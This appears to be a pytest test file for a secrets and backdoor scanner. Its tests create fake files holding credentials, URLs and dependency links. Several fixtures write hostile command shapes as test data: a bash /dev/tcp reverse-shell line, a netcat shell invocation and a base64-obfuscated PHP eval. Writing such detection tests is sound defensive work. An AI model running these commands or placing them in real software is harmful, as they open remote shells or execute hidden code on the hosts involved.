"""hiddenscope_scanner.py: scan_file / scan_tree / scan_deps.

These read real files, but every file is created by the test itself
under tmp_path -- no test ever scans a real path on the host, and no
fixture content is a real, live secret (all fake/example-shaped
values, same convention used for the Pi board revision code and node
tokens in earlier phases).
"""
import hiddenscope_scanner as hs


def _findings_by_category(findings, category):
    return [f for f in findings if f.category == category]


def _descs(findings):
    return {f.description for f in findings}


# ── scan_file: detection, one case per pattern family ────────────────────


def test_scan_file_embedded_ssh_private_key(tmp_path):
    f = tmp_path / "id_rsa"
    f.write_text("-----BEGIN OPENSSH PRIVATE KEY-----\nfakekeydata\n-----END OPENSSH PRIVATE KEY-----\n")

    findings = hs.scan_file(f)

    assert any(fnd.description == "Embedded SSH/TLS private key" and fnd.severity == "critical" for fnd in findings)


def test_scan_file_aws_access_key(tmp_path):
    f = tmp_path / "config.py"
    # AWS's own documentation example key -- not a real credential.
    f.write_text('aws_key = "AKIAIOSFODNN7EXAMPLE"\n')

    findings = hs.scan_file(f)

    assert any(fnd.description == "AWS access key ID" and fnd.severity == "high" for fnd in findings)


def test_scan_file_hardcoded_credential_real_looking(tmp_path):
    f = tmp_path / "config.py"
    f.write_text('api_key = "aB3xR9zQmK7wLpN2"\n')

    findings = hs.scan_file(f)

    hits = [fnd for fnd in findings if fnd.description == "Hardcoded credential"]
    assert len(hits) == 1
    assert hits[0].severity == "high"
    assert hits[0].suppressed_by == ""


def test_scan_file_hardcoded_credential_placeholder_is_downgraded(tmp_path):
    f = tmp_path / "config.py"
    f.write_text('password = "enter_key_here"\n')

    findings = hs.scan_file(f)

    hits = [fnd for fnd in findings if fnd.description == "Hardcoded credential"]
    assert len(hits) == 1
    assert hits[0].severity == "low"  # "high" downgraded 2 steps
    assert "placeholder" in hits[0].suppressed_by


def test_scan_file_dev_tcp_reverse_shell(tmp_path):
    f = tmp_path / "backdoor.sh"
    f.write_text("exec 3<>/dev/tcp/10.0.0.1/4444\n")

    findings = hs.scan_file(f)

    assert any(fnd.description == "Bash /dev/tcp reverse-shell path" and fnd.severity == "critical" for fnd in findings)


def test_scan_file_netcat_reverse_shell(tmp_path):
    f = tmp_path / "backdoor.sh"
    # The pattern's optional -[el]+ group takes a bare flag directly
    # followed by the IP, not a flag argument like "-e /bin/sh" -- that
    # (realistic) shape doesn't match, so keep it flag-then-IP.
    f.write_text("nc -e 8.8.8.8 4444\n")

    findings = hs.scan_file(f)

    assert any(
        fnd.description == "Netcat reverse/bind shell invocation" and fnd.severity == "critical"
        for fnd in findings
    )


def test_scan_file_obfuscated_eval(tmp_path):
    f = tmp_path / "payload.php"
    f.write_text('eval(base64_decode("c29tZV9wYXlsb2Fk"));\n')

    findings = hs.scan_file(f)

    assert any(
        fnd.description == "Obfuscated eval/exec (base64-wrapped)" and fnd.severity == "critical"
        for fnd in findings
    )


def test_scan_file_public_ipv4_is_flagged(tmp_path):
    f = tmp_path / "config.py"
    f.write_text('DNS_SERVER = "8.8.8.8"\n')

    findings = hs.scan_file(f)

    assert any(fnd.description == "Hardcoded public IPv4 address" and fnd.severity == "medium" for fnd in findings)


def test_scan_file_documentation_ipv4_is_not_flagged(tmp_path):
    f = tmp_path / "config.py"
    f.write_text('TEST_SERVER = "192.0.2.55"\n')  # RFC 5737 TEST-NET-1

    findings = hs.scan_file(f)

    assert not any(fnd.description == "Hardcoded public IPv4 address" for fnd in findings)


def test_scan_file_hardcoded_url_not_benign(tmp_path):
    f = tmp_path / "config.py"
    f.write_text('ENDPOINT = "https://api.mycompany-internal-service.com/v1/data"\n')

    findings = hs.scan_file(f)

    hits = [fnd for fnd in findings if fnd.description == "Hardcoded HTTP/S URL"]
    assert len(hits) == 1
    assert hits[0].severity == "low"
    assert hits[0].suppressed_by == ""


def test_scan_file_benign_domain_url_is_downgraded(tmp_path):
    f = tmp_path / "config.py"
    f.write_text('DOCS = "https://example.com/docs/api-reference-page"\n')

    findings = hs.scan_file(f)

    hits = [fnd for fnd in findings if fnd.description == "Hardcoded HTTP/S URL"]
    assert len(hits) == 1
    assert hits[0].severity == "info"
    assert "benign domain" in hits[0].suppressed_by


# ── scan_file: FP-reduction integration ───────────────────────────────────


def test_scan_file_commented_line_is_downgraded(tmp_path):
    f = tmp_path / "config.py"
    f.write_text('# api_key = "aB3xR9zQmK7wLpN2skip"\n')

    findings = hs.scan_file(f)

    hits = [fnd for fnd in findings if fnd.description == "Hardcoded credential"]
    assert len(hits) == 1
    assert hits[0].severity == "medium"  # "high" downgraded 1 step
    assert "commented line" in hits[0].suppressed_by


def test_scan_file_in_test_directory_is_downgraded(tmp_path):
    test_dir = tmp_path / "tests"
    test_dir.mkdir()
    f = test_dir / "config.py"
    f.write_text('api_key = "aB3xR9zQmK7wLpN2"\n')

    findings = hs.scan_file(f)

    hits = [fnd for fnd in findings if fnd.description == "Hardcoded credential"]
    assert len(hits) == 1
    assert hits[0].severity == "medium"  # "high" downgraded 1 step
    assert "test/fixture path" in hits[0].suppressed_by


# ── scan_file: boundary/skip behavior ─────────────────────────────────────


def test_scan_file_skips_binary_extensions_regardless_of_content(tmp_path):
    f = tmp_path / "image.png"
    f.write_text('password = "aB3xR9zQmK7wLpN2"\n')  # would trigger if scanned

    assert hs.scan_file(f) == []


def test_scan_file_skips_empty_file(tmp_path):
    f = tmp_path / "empty.py"
    f.write_text("")

    assert hs.scan_file(f) == []


def test_scan_file_skips_file_over_max_bytes(tmp_path):
    f = tmp_path / "big.py"
    f.write_text('password = "aB3xR9zQmK7wLpN2"\n' * 10)  # well over 10 bytes

    assert hs.scan_file(f, max_bytes=10) == []


def test_scan_file_min_sev_filters_lower_severity_findings(tmp_path):
    f = tmp_path / "config.py"
    f.write_text("telemetry endpoint enabled\n")  # "Phone-home/telemetry keyword" -> info

    assert hs.scan_file(f, min_sev="info") != []
    assert hs.scan_file(f, min_sev="high") == []


def test_scan_file_lock_file_suppresses_url_noise_but_catches_real_keys(tmp_path):
    f = tmp_path / "package-lock.json"
    f.write_text(
        '{"resolved": "https://registry.npmjs.org/foo/-/foo-1.0.0.tgz", '
        '"key": "-----BEGIN OPENSSH PRIVATE KEY-----\\nfake\\n-----END OPENSSH PRIVATE KEY-----"}\n'
    )

    findings = hs.scan_file(f)
    descs = _descs(findings)

    assert "Embedded SSH/TLS private key" in descs  # always-scan, even in lock files
    assert "Hardcoded HTTP/S URL" not in descs  # lock-file URL noise suppressed


# ── scan_tree ──────────────────────────────────────────────────────────────


def test_scan_tree_walks_directory_and_skips_dirs_and_symlinks(tmp_path):
    (tmp_path / "secret.py").write_text('aws_key = "AKIAIOSFODNN7EXAMPLE"\n')

    git_dir = tmp_path / ".git"
    git_dir.mkdir()
    (git_dir / "config").write_text('aws_key = "AKIAIOSFODNN7EXAMPLE"\n')  # must be skipped

    (tmp_path / "link.py").symlink_to(tmp_path / "secret.py")  # must be skipped

    custom_skip = tmp_path / "vendor_custom"
    custom_skip.mkdir()
    (custom_skip / "other.py").write_text('aws_key = "AKIAIOSFODNN7EXAMPLE"\n')

    al = hs.AllowList()
    al.scan_dirs.add("vendor_custom")

    findings = list(hs.scan_tree(tmp_path, al=al, quiet=True))

    assert len(findings) == 1
    assert findings[0].source == str(tmp_path / "secret.py")


# ── scan_deps ──────────────────────────────────────────────────────────────


def test_scan_deps_requirements_txt(tmp_path):
    f = tmp_path / "requirements.txt"
    f.write_text(
        "requests==2.31.0\n"
        "-e git+https://github.com/foo/bar.git#egg=bar\n"
        "git+https://github.com/foo/baz.git\n"
        "https://example.com/pkg.whl\n"
    )

    findings = hs.scan_deps(f)
    by_cat = {fnd.category for fnd in findings}

    assert by_cat == {"deps.vcs_editable", "deps.vcs_direct", "deps.url_direct"}
    assert len(findings) == 3  # requests==2.31.0 produces no finding


def test_scan_deps_pyproject_dependency_links(tmp_path):
    f = tmp_path / "pyproject.toml"
    f.write_text('dependency_links = ["https://example.com/pkg"]\n')

    findings = hs.scan_deps(f)

    assert len(findings) == 1
    assert findings[0].category == "deps.dependency_links"
